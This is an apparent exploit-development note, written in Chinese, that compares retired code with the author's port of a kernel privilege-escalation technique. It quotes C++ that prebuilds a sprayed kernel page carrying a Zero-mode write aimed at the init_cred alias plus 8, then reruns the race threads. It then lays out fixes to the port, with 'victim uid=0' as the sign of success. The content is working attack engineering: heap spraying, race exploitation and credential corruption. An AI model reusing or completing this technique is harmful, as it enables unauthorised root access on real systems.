# 43499 · W2b 的机制（round 114，退役代码逐字）

## 退役原文（`route/multicast_waiter_route.cpp` + `MulticastPolicy` 实现 ✓）

```cpp
// ① w2_fast_repair_prebuild（凭据写之前调用 ✓）
const WriteRequest repair_request = WriteRequest::make(
        data_alias(init_cred_image_addr()) + 8,     // target = init_cred 别名 + 8 ✓
        WriteMode::Zero,                            // ★ mode = Zero（不是 Credential ✗）
        1);                                         // ★ leaf = 1 ⇒ preserve_child = false ✓
current.base = spray::prepare_good_kernel_page(repair_request);   // 用修复请求建页面
spray::stash_prebuilt_page();                                     // 藏起来 ✓
pr_info("W2 fast repair payload prebuilt");

// ② w2_fast_repair_activate（凭据写之后 ✓）
spray::activate_prebuilt_page();                     // 重新放置（= 再 spray ✓）
pr_info("W2b: firing prebuilt init_cred+8 repair");
race.fast_repair.store(1);                           // 模式位：route 以修复模式跑 ✓
race::run_main_route_threads(repair_request);        // 再跑一轮 ✓
```

## 与我的移植的差异（三条，都很具体 ✓）

| 项 | 退役 | 我 |
| --- | --- | --- |
| 模式 | `Zero` + `leaf=1`（叶子写 ⇒ 元组 `{pc=target−8, right=0, left=0}` ✓） | 从未做过 ✓（只做过 Credential） |
| 目标 | `init_cred 别名 + 8`（usage 字段 ✓） | 从未做过 |
| 轮次 | 凭据写**之前**预置一份修复页面，写**之后**激活并再跑一轮 ✓ | 只有一轮 ✗ |

## 本树要补的（规格修正版 ✓）

1. 第二份页面用 **`WriteRequest{target = init_cred_alias + 8, mode = Zero, preserve_child = false}`** ✓
   （`WriteRequest::make(target, Zero, 1)` 的语义 ✓）⇒ 元组由本树 `write_layout`/`arm_for` 自动算 ✓；
2. 发送：**再开一对 shaping**（或复用同一对再发一次 ✓）⇒ 第二份页面的内核地址由**第二次 `prepare`** 或
   同块再发确定 ✓（退役是"重新 prepare 一遍" ✓）；
3. 第二轮 route 用同一引擎 ✓（`fast_repair` 位在本树对应"另一个 WriteRequest" ✓ 无需全局位 ✓）；
4. 判据：`main: victim uid=0` ✓；旁证：第二轮 `status=0 clean=1/1 step=0` ✓。
